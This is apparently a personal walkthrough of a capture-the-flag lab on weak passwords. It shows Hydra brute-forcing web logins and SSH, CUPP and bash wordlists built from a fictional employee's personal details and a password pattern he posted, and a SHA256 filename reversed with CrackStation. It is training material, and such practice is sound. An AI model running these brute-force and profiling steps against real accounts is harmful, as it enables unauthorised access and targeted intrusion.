@@ -1,0 +1,146 @@
+explpoit weak password practices
+
+_________________________________
+level1
+firewall with default password (user: admin)
+
+as usual
+echo "10.113.187.188 firewall.thm" >> /etc/hosts
+
+# note: hydra -s <port>
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.187.188 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -s 5001
+
+_________________________________
+level2
+internal employee login panel, common company keywords as passwords
+
+echo "10.113.187.188 jobs.thm" >> /etc/hosts
+
+i made a wordlist of all company keywords I found
+cat jobs.txt
+innovation
+excellence
+security
+digital
+cloud
+future
+talent
+
+hydra -l marco -P jobs.txt 10.113.187.188 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -s 5002
+
+_________________________________
+level3
+derive Marco's password from personal info.
+
+we will use info from jobs.thm to derive Marco's password
+
+echo "10.113.187.188 social.thm" >> /etc/hosts
+
+we will use some tool to generate a wordlist
+
+all info we have on marco:
+cat marco_info.txt
+marky
+Marco
+Bianchi
+14021995
+
+now i tried crunch using -q marco_info.txt -o wordlist.txt
+but it didn't work, so we will use CuPP (Common User Passwords Profiler)
+
+git clone https://github.com/Mebus/cupp.git
+cd cupp
+python3 cupp.py -i
+
+cuPP's format is exactly what we need, look at this
+
+> First Name: Marco
+> Surname: Bianchi
+> Nickname: marky
+> Birthdate (DDMMYYYY): 14021995
+
++ a lot other info that we dont have
+
+the tool even motivates us...
+Saving dictionary to marco.txt, counting 7436 words
+[+] Now load your pistolero with marco.txt and shoot! Good luck!
+
+hydra -l marco -P marco.txt 10.113.187.188 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -s 5003
+
+that was fast!
+
+marco is a funny dude
+
+Profile
+Marco Bianchi
+2 hours ago • 🌐
+
+My tip for strong passsord: I take a company keyword, capitalize it, 
+then append the year like 2024 or any other number and an exclamation mark. 
+<list_of_company_keywords>
+
+_________________________________
+level4
+Marco recently uploaded a new profile picture.
+For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png.
+Your task is to identify the original filename of Marco’s uploaded profile picture
+
+we can't navigate the social app, so lets try some gobuster
+
+gobuster dir -u http://10.113.187.188:5003/ -w /usr/share/wordlists/dirb/common.txt -x .php,.js,.bak
+
+well, that went horribly
+/login                (Status: 405) [Size: 153]
+/logout               (Status: 302) [Size: 189]
+
+ok, we have to try looking at the page
+the only thing we can do is view source
+opening the image in a new tab has a very weird URL...
+http://10.113.187.188:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
+that is 99% the SHA256 hash
+
+crackstation for the win! (crackstation.net)
+
+Hash	                                                            Type	Result
+d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b	sha256	family
+
+_________________________________
+level5
+
+Marco has revealed his password pattern on social.thm:5003,
+using predictable rules based on keywords and formatting.
+Use this information to generate a targeted wordlist 
+brute-force the SSH service with username marco.
+
+marcos message:
+My tip for strong passsord: I take a company keyword, capitalize it, 
+then append the year like 2024 or any other number and an exclamation mark.
+security excellence innovation digital cloud
+
+capitalised keywords:
+cat keywords.txt 
+Security
+Excellence
+Innovation
+Digital
+Cloud
+
+I got some scripting help from gemini, to generate the wordlist
+we're assuming the years are kinda recent, 
+everything else is how marco described it
+
+for word in $(cat keywords.txt); do
+  for year in {2015..2026}; do
+    echo "${word}${year}!"
+  done
+done > marco_wordlist.txt
+
+hydra -l marco -P marco_wordlist.txt 10.113.187.188 -t4 ssh
+
+[DATA] attacking ssh://10.113.187.188:22/
+[22][ssh] host: 10.113.187.188   login: marco   password: Security2024!
+
+the assumption was correct
+
+thanks for reading and thank you for the help gemini!
